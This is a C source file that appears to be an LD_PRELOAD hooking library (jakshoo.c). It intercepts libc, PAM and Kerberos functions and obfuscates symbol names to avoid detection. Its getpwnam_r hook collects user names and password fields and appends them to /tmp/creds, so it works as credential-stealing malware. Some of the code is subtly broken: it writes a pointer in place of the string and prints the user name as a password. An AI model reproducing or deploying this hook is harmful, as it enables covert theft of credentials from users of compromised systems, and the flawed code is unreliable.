// jakshoo.c

#define _GNU_SOURCE  
#include <dlfcn.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>
#include <sys/types.h>
#include <string.h> 
#include <pwd.h>
#include <security/pam_modules.h>  
#include <security/pam_ext.h>  
#include <krb5/krb5.h>
#include <security/pam_modutil.h>  
#include "utils/config.h"
#include "utils/obfuscate.h"

static int (*original_getaddrinfo)(const char *node, const char *service, const struct addrinfo *hints, struct addrinfo **res);
static struct passwd *(*original_getpwnam)(const char *name);
static int (*original_getpwnam_r)(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result);
static int (*original_pam_get_item)(const pam_handle_t *pamh, int item_type, const void **item);
static krb5_error_code (*original_krb5_get_init_creds_password)(krb5_context context, 
											krb5_creds * creds, 
											krb5_principal client, 
											const char * password, 
											krb5_prompter_fct prompter, 
											void * data, krb5_deltat start_time, 
											const char * in_tkt_service, 
											krb5_get_init_creds_opt * k5_gic_options);
static int (*original_pam_acct_mgmt)(pam_handle_t *pamh, int flags);




// PAM hooks


int pam_acct_mgmt(pam_handle_t *pamh, int flags){
	if(original_pam_acct_mgmt == NULL){
		original_pam_acct_mgmt = (int(*)(pam_handle_t*, int))dlsym(RTLD_NEXT, AY_OBFUSCATE("pam_acct_mgmt"));
	}
	int ret = original_pam_acct_mgmt(pamh, flags);
	return ret;
}


// end PAM hooks

int getaddrinfo(const char *node, const char *service, const struct addrinfo *hints, struct addrinfo **res){
	if(original_getaddrinfo == NULL){
		original_getaddrinfo = (int(*)(const char*, const char*, const struct addrinfo*, struct addrinfo**))dlsym(RTLD_NEXT, AY_OBFUSCATE("getaddrinfo"));
	}
	int ret;
	ret = original_getaddrinfo(node, service, hints, res);
	printf(AY_OBFUSCATE("getaddrinfo :: \"%s\"\n"), node);
	return ret;
};

struct passwd *getpwnam(const char *name){
	if(original_getpwnam == NULL){
		original_getpwnam = (struct passwd *(*)(const char*))dlsym(RTLD_NEXT, AY_OBFUSCATE("getpwnam"));
	}
	printf(AY_OBFUSCATE("getpwnam :: \"%s\"\n"), name);
	passwd *ret = NULL;
	ret = original_getpwnam(name);
	return ret;
}

int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result){
	if(original_getpwnam_r == NULL){
		original_getpwnam_r = (int(*)(const char*, struct passwd*, char *, size_t, struct passwd **))dlsym(RTLD_NEXT, AY_OBFUSCATE("getpwnam_r"));
	}
	static FILE *fptr; 
	int ret;
	ret = original_getpwnam_r(name, pwd, buf, buflen, result);
	fptr = fopen("/tmp/creds","at");
	if(!fptr){
		fptr = fopen("/tmp/creds", "wt");
	}
	printf(AY_OBFUSCATE("getpwnam_r :: name: \"%s\" | password \"%s\"\n"), name, pwd->pw_name);
	size_t credsSize = (strlen(name) + strlen(pwd->pw_passwd) + 10);
	char* concatCreds = malloc(credsSize);

	strcpy(concatCreds, name);
	strcat(concatCreds, pwd->pw_passwd);

	fwrite(&concatCreds, sizeof(concatCreds), 1, fptr); 

	fclose(fptr);
	free(concatCreds);

	return ret;
}
